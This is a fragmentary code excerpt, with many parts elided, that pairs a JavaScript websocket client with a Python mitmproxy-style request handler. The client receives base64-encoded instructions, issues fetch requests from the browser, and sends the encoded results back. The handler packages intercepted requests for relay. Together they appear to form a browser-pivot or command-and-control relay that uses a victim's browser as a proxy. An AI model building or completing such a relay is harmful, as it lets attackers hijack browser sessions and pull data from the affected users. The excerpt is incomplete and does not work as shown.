...
function socket_start(){
    ...
    socket121.onmessage = function(event) {
        const receivedMessage = atob(event.data);
        ...
        if (parts.length == 2) {
            try {
                ...
                newdata1 = atob(newdata1);
                newdata2 = atob(newdata2);
                newdata3 = atob(newdata3);
                newdata4 = atob(newdata4);
                newdata5 = atob(newdata5);
                const fetchOptions = {};
                const headers = {};
                ...
                .catch(error => {
                    socket121.send(btoa(varChars + '------------' + btoa(0) + '------------' + btoa(0) + '------------' + btoa(0)));
                });
            } catch (error) {
                socket121.send(btoa(varChars + '------------' + btoa(0) + '------------' + btoa(0) + '------------' + btoa(0)));
            }
...
class CustomResponse:
    ...
    async def handle_delayed_request(self, flow: http.HTTPFlow) -> None:
        ...
        burp0_json = {
            "data": base64.b64encode(data1.encode()).decode(),
            "header": base64.b64encode(newheaders.encode()).decode(),
            "method": str(method),
            "type": reqtype,
